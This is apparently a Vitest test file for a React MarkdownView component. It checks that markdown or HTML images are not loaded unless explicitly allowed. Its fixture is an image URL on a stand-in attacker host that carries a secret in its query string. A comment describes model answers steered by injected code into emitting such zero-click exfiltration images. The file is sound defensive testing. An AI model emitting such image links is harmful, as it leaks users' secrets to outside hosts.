import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { MarkdownView } from "./MarkdownView";

const OUTSIDE = "https://attacker.example/p.png?k=secret";

const html = (value: string, allowImages?: boolean) =>
  renderToStaticMarkup(createElement(MarkdownView, { value, allowImages }));

// The one component test: a model's answer can be steered by the code it read,
// and an image would load, with whatever is in its address, with no click.
describe("MarkdownView", () => {
  it.each([
    ["inline", `![a picture](${OUTSIDE})`],
    ["reference style", `![a picture][1]\n\n[1]: ${OUTSIDE}`],
    ["raw HTML", `<img src="${OUTSIDE}" alt="a picture">`],
  ])("never loads an image unless asked: %s", (_label, markdown) => {
    const rendered = html(markdown);

    expect(rendered).not.toContain("<img");
    expect(rendered).not.toContain('rel="preload"');
    expect(rendered).not.toContain(`src="${OUTSIDE}"`);
  });

  it("keeps an image's alt text as words", () => {
    expect(html(`![a picture](${OUTSIDE})`)).toContain("a picture");
  });

  it("shows images in markdown the user wrote", () => {
    expect(html("![a picture](https://example.com/p.png)", true)).toContain('<img src="https://example.com/p.png"');
  });

  it("still renders the rest of the markdown", () => {
    expect(html("## Steps\n\n`docker ps`")).toContain("<h2>Steps</h2>");
    expect(html("## Steps\n\n`docker ps`")).toContain("<code>docker ps</code>");
  });
});
